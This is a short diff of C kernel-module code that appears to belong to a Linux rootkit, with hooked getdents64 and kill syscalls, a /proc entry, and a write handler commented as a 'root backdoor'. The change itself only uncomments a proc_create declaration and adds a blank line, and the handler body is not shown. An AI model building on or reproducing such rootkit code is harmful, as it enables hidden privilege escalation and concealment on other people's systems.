@@ -34,8 +34,7 @@ orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 //创建与删除一个/proc下面的项目
 struct proc_dir_entry *entry;
-//static inline struct proc_dir_entry *
-//proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
+static inline struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
  
 void
 proc_remove(struct proc_dir_entry *entry);
@@ -389,6 +388,7 @@ out:
 	kfree(kdirent);
 	return ret;
 }
+
 // root后门
 ssize_t write_handler(struct file *filp, const char __user *buff, 
 				size_t count, loff_t *offp) {
